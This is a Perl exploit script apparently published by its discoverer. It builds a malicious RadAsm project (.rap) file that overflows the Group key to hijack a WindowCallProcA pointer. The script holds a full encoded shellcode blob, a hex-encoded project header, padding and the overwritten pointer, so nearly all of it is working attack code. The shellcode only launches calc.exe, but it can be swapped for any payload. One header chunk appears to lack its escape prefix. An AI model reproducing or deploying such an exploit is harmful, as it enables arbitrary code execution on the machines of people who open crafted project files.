#!/usr/bin/perl
# RadAsm <=2.2.1.4 WindowCallProcA Pointer Hijack Exploit
#Tested on Windows XP SP2 FR,perhaps work as will underWindows XP SP3.
#Long buffer passed to the program by Group key in the project file ".rap files" can lead to Overwrite the pointer of 
#WindowCallProcA that was stored in memory.
#So we will over write the pointer and make it point to our shellcode address
#This exploit was dedicated to the previous version "im to lazy to make other exploit for the newest version :)" 2.2.1 #if you want to build your own exploit, pay attention to the address of shellcode and the buffer befor and after the #shellcode.
#Sorry for my bad english :=)
#greetZ to:Gaming_Master,Mouradpr,Pirat_Digital,Koudelka,djug,Alpha_Hunter,DeltaAzize,synt_err,super-crystal,Al-alamE
#Anaconda,AT4RE TEAM,Arab4Services TEAM,All Algerian Hackerz.

print "\nRadAsm <=2.2.1.4 WindowCallProcA Pointer Hijack Exploit\n";
print "Discovered by DATA_SNIPER\n";
print "\n";
print "[->] Building  poc.rap..\n";
print "[->] poc.rap Created have unf :)\n";
# win32_exec -  EXITFUNC=process CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com
my $shellcode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34".
"\x42\x30\x42\x30\x42\x30\x4b\x58\x45\x44\x4e\x43\x4b\x38\x4e\x47".
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x31\x4b\x48".
"\x4f\x55\x42\x32\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x33\x4b\x58".
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c".
"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e".
"\x46\x4f\x4b\x43\x46\x55\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48".
"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x44".
"\x4b\x58\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x31\x4b\x58".
"\x41\x50\x4b\x4e\x49\x38\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33".
"\x42\x4c\x46\x56\x4b\x38\x42\x44\x42\x43\x45\x58\x42\x4c\x4a\x47".
"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x38\x42\x37\x4e\x51\x4d\x4a".
"\x4b\x58\x4a\x46\x4a\x30\x4b\x4e\x49\x50\x4b\x48\x42\x38\x42\x4b".
"\x42\x30\x42\x50\x42\x50\x4b\x38\x4a\x36\x4e\x53\x4f\x45\x41\x33".
"\x48\x4f\x42\x56\x48\x35\x49\x38\x4a\x4f\x43\x38\x42\x4c\x4b\x47".
"\x42\x45\x4a\x46\x50\x57\x4a\x4d\x44\x4e\x43\x37\x4a\x36\x4a\x49".
"\x50\x4f\x4c\x48\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x56".
"\x4e\x36\x43\x36\x50\x52\x45\x46\x4a\x57\x45\x56\x42\x30\x5a";

$FileHeader =
"\x5B\x50\x72\x6F\x6A\x65\x63\x74\x5D\x0D\x0A\x41\x73\x73\x65\x6D\x62\x6C\x65\x72\x3D\x6D\x61\x73\x6D\x0D\x0A\x47\x72\x6F\x75\x70".
"\x3D\x31\x0D\x0A\x47\x72\x6F\x75\x70\x45\x78\x70\x61\x6E\x64\x3D\x31\x0D\x0A\x5B\x46\x69\x6C\x65\x73\x5D\x0D\x0A\x31\x3D\x41\x56".
"\x50\x20\x4F\x76\x65\x72\x2E\x41\x73\x6D\x0D\x0A\x32\x3D\x41\x56\x50\x20\x4F\x76\x65\x72\x2E\x49\x6E\x63\x0D\x0A\x5B\x4D\x61\x6B".
"\x65\x46\x69\x6C\x65\x73\x5D\x0D\x0A\x30\x3D\x41\x56\x50\x20\x4F\x76\x65\x72\x2E\x72\x65\x73\x0D\x0A\x5B\x4D\x61\x6B\x65\x44\x65".
"\x66\x5D\x0D\x0A\x4D\x65\x6E\x75\x3D\x30\x2C\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x31\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x2C\x30".
"\x2C\x30\x2C\x30\x2C\x30\x2C\x30\x0D\x0A\x31\x3D\x34\x2C\x4F\x2C\x24\x42\x5C\x52\x43\x2E\x45\x58\x45\x20\x2F\x76\x2C\x31\x0D\x0A".
"\x32\x3D\x33\x2C\x4F\x2C\x24\x42\x5C\x4D\x4C\x2E\x45\x58\x45\x20\x2F\x63\x20\x2F\x63\x6F\x66\x66\x20\x2F\x43\x70\x20\x2F\x6E\x6F".
"6C\x6F\x67\x6F\x20\x2F\x49\x22\x24\x49\x22\x2C\x32\x0D\x0A\x33\x3D\x35\x2C\x4F\x2C\x24\x42\x5C\x4C\x49\x4E\x4B\x2E\x45\x58\x45".
"\x20\x2F\x53\x55\x42\x53\x59\x53\x54\x45\x4D\x3A\x57\x49\x4E\x44\x4F\x57\x53\x20\x2F\x52\x45\x4C\x45\x41\x53\x45\x20\x2F\x56\x45".
"\x52\x53\x49\x4F\x4E\x3A\x34\x2E\x30\x20\x2F\x4C\x49\x42\x50\x41\x54\x48\x3A\x22\x24\x4C\x22\x20\x2F\x4F\x55\x54\x3A\x22\x24\x35".
"\x22\x2C\x33\x0D\x0A\x34\x3D\x30\x2C\x30\x2C\x2C\x35\x0D\x0A\x35\x3D\x72\x73\x72\x63\x2E\x6F\x62\x6A\x2C\x4F\x2C\x24\x42\x5C\x43".
"\x56\x54\x52\x45\x53\x2E\x45\x58\x45\x2C\x72\x73\x72\x63\x2E\x72\x65\x73\x0D\x0A\x36\x3D\x2A\x2E\x6F\x62\x6A\x2C\x4F\x2C\x24\x42".
"\x5C\x4D\x4C\x2E\x45\x58\x45\x20\x2F\x63\x20\x2F\x63\x6F\x66\x66\x20\x2F\x43\x70\x20\x2F\x6E\x6F\x6C\x6F\x67\x6F\x20\x2F\x49\x22".
"\x24\x49\x22\x2C\x2A\x2E\x61\x73\x6D\x0D\x0A\x37\x3D\x30\x2C\x30\x2C\x22\x24\x45\x5C\x4F\x6C\x6C\x79\x44\x62\x67\x22\x2C\x35\x0D".
"\x0A\x5B\x47\x72\x6F\x75\x70\x5D\x0D\x0A\x47\x72\x6F\x75\x70\x3D";
$hijackedPointer = "\x46\x52\x49\x00";
$overflow = "\x41" x 2143 ;
$INCSELEDGE = "\x41" x 66 ;
$SD = "\x00\x0D\x0A" ;
open(my $poc, "> POC.rap");
print $poc $FileHeader.$INCSELEDGE.$shellcode.$overflow.$hijackedPointer.$SD;
close($poc);


